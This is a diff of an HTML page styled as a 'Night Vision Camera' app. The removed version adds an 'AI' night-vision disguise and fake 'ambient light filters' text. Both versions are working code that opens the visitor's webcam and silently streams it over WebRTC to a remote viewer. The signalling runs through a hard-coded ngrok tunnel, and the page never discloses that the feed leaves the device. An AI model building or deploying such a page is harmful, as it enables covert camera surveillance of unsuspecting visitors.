@@ -1,39 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Night Vision Camera</title>
-  <style>
-    body { background: black; color: lime; font-family: monospace; text-align: center; }
-    video { width: 90vw; max-width: 600px; margin-top: 20px;
-            filter: grayscale(1) brightness(1.5) contrast(2) hue-rotate(90deg); }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Night Vision Cam</title>
 </head>
 <body>
-  <h1>AI Night Vision Camera</h1>
-  <p>Initializing ambient light filters...</p>
-  <video id="video" autoplay muted playsinline></video>
-
-  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <h1>Live Feed from Night Vision Cam</h1>
+  <video id="video" autoplay></video>
+  <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
   <script>
     const socket = io('https://cc9e-45-246-151-253.ngrok-free.app');
-
-    const peer = new RTCPeerConnection();
     const video = document.getElementById('video');
 
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-      video.srcObject = stream;
-      stream.getTracks().forEach(track => peer.addTrack(track, stream));
-      return peer.createOffer();
-    }).then(offer => {
-      peer.setLocalDescription(offer);
-      socket.emit('offer', offer);
+    let localStream;
+    let peerConnection;
+    const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
+
+    socket.on('connect', () => {
+      console.log("Connected to signaling server");
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          console.log("Camera access granted");
+          localStream = stream;
+          video.srcObject = stream;
+
+          peerConnection = new RTCPeerConnection(config);
+          localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+
+          peerConnection.onicecandidate = event => {
+            if (event.candidate) {
+              console.log("Sending ICE candidate");
+              socket.emit('candidate', event.candidate);
+            }
+          };
+
+          peerConnection.createOffer()
+            .then(offer => {
+              console.log("Sending offer:", offer);
+              return peerConnection.setLocalDescription(offer);
+            })
+            .then(() => {
+              socket.emit('offer', peerConnection.localDescription);
+            })
+            .catch(error => console.error("Error creating offer:", error));
+        })
+        .catch(err => console.error("Camera error:", err));
     });
 
-    socket.on('answer', answer => peer.setRemoteDescription(answer));
-    socket.on('candidate', candidate => peer.addIceCandidate(candidate));
-    peer.onicecandidate = ({candidate}) => {
-      if (candidate) socket.emit('candidate', candidate);
-    };
+    socket.on('answer', answer => {
+      console.log("Received answer:", answer);
+      peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+    });
+
+    socket.on('candidate', candidate => {
+      console.log("Received ICE candidate:", candidate);
+      peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+    });
   </script>
 </body>
 </html>
